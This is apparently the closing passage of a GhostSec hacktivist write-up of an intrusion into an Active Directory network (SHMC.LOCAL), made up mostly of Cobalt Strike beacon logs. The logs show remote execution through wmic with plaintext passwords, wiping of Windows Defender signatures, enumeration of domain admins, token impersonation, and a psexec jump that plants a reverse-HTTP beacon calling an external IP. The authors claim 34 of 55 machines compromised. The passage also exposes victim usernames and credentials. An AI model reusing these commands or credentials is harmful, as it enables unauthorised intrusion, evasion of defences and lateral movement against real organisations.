beacon> run wmic /node:AQUILA /user:sergeev.ma /password:iJEL6TEt process call create "cmd.exe /c c:\system.exe"  
[*] Tasked beacon to run: wmic /node:AQUILA /user:sergeev.ma /password:iJEL6TEt process call create "cmd.exe /c c:\system.exe"  
03/23 22:59:55 UTC [checkin] host called home, sent: 118 bytes  
03/23 22:59:57 UTC [output]  
received output:  
Executing (Win32_Process)->Create()  
Method execution successful.  
Out Parameters:  
instance of __PARAMETERS  
{  
       ProcessId = 7828;  
       ReturnValue = 0;  
};  



beacon> ls \\AQUILA\C$
[*] Tasked beacon to list files in \\AQUILA\C$
[+] host called home, sent: 29 bytes
03/23 23:00:13 UTC [output]
\\AQUILA\C$\*
D       0       11/26/2021 21:43:28     $Recycle.Bin
F       384322  07/16/2016 23:18:08     bootmgr
F       1       07/16/2016 23:18:08     BOOTNXT
D       0       11/13/2020 21:30:11     Distrib
D       0       10/06/2020 22:11:30     Documents and Settings
D       0       06/17/2021 08:08:42     ExchangeCert
D       0       10/28/2020 22:54:15     inetpub
D       0       10/09/2020 08:29:13     LdapAdmin
D       0       10/28/2020 23:06:10     Logs
D       0       10/26/2020 16:12:10     MSOCache
F       4414324736      03/17/2022 21:08:41     pagefile.sys
D       0       10/07/2020 03:26:41     PerfLogs
D       0       09/01/2021 22:03:05     Program Files
D       0       10/28/2020 23:08:00     Program Files (x86)
D       0       03/24/2022 06:25:40     ProgramData
D       0       10/06/2020 22:11:32     Recovery
D       0       10/07/2020 03:48:23     System Volume Information
D       0       11/26/2021 21:43:18     Users
D       0       03/24/2022 08:52:54     Windows
D       0       10/08/2020 23:58:52     zabbix_agent
F       55386   11/21/2021 23:14:42     zabbix_agentd.log

beacon> rm system.exe
[*] Tasked beacon to remove system.exe
[+] host called home, sent: 18 bytes
```

So I've learned this technique that is related to **Defense Evasion** and best of all this will make Windows Defender useless to get
rid of all of the signatures and pop a shell easily. I had to check the usernames since `sergeev.ma` didn't work. Which is
why I've relied on `net users \\<IP>` to check other **Domain Admins** of which I could authenticate on active directory.

```
beacon> powershell icm -computername aquila -scriptblock {cmd /c "c:\program files\windows defender\mpcmdrun.exe" -removedefinitions -all }
[*] Tasked beacon to run: icm -computername aquila -scriptblock {cmd /c "c:\program files\windows defender\mpcmdrun.exe" -removedefinitions -all }
[+] host called home, sent: 593 bytes
[+] received output:
#< CLIXML

Service Version: 4.18.2107.4
Engine Version: 1.1.18400.5
AntiSpyware Signature Version: 1.347.80.0
AntiVirus Signature Version: 1.347.80.0
NRI Engine Version: 1.1.18400.5
NRI Signature Version: 1.347.80.0

Starting engine and signature rollback to none...
Done!
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S="progress" RefId="1"><TNRef RefId="0" /><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>

beacon> net user \\AQUILA
[*] Tasked beacon to run net user on AQUILA
[+] host called home, sent: 105057 bytes
[+] received output:
Users for \\AQUILA:

????????????? (admin)
?????
krbtgt
DefaultAccount
day.dozor (admin)
replicant.user (admin)
monit.user
belevax (admin)
aliev.rs (admin)
boba.se
kozyrev.sd (admin)
sysadm (admin)
..[snip]..

beacon> rev2self
[+] Tasked beacon to revert token
beacon> make_token SHMC.LOCAL\replicant.user 166D3f75
[*] Tasked beacon to create a token for SHMC.LOCAL\replicant.user
beacon> jump psexec64 AQUILA sex
[*] Tasked beacon to run windows/beacon_http/reverse_http (173.249.45.143:80) on AQUILA via Service Control Manager (\\AQUILA\ADMIN$\a25fd0c.exe)
[+] host called home, sent: 60 bytes
[+] Impersonated NT AUTHORITY\СИСТЕМА
[+] host called home, sent: 291366 bytes
[+] received output:
Started service a25fd0c on AQUILA
```

On the **Event Logs**

```
<REDACTED> *** initial beacon from replicant.user *@172.16.0.20 (AQUILA)
```

So far we have penetrated 34 machines out of 55 on the active directory network. Not all machines are powered on due to
employees have different schedules yet we didn't have to stay for long since we got what we're looking for and there
isn't much to find unless we want to keep fooling around.

#### References
* [Metasploit to Beacon Initial Foothold](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/init-access_client-side-exploits.htm#_Toc65482765)
* [SCPA Cherrytree Notes](https://github.com/U53RW4R3/SCPA/tree/main/SCPA-Phases)

Overall we hope this can really give you a new insight on not just our approach in our attacks during operations but give you some idea of how AD attacks can go, there isnt much to say in this ending here though we would like to say thank you for reading through it all and we really do hope you enjoyed this writeup and if you have any feedbacks do let us know

HACK THE PLANET

#GhostSec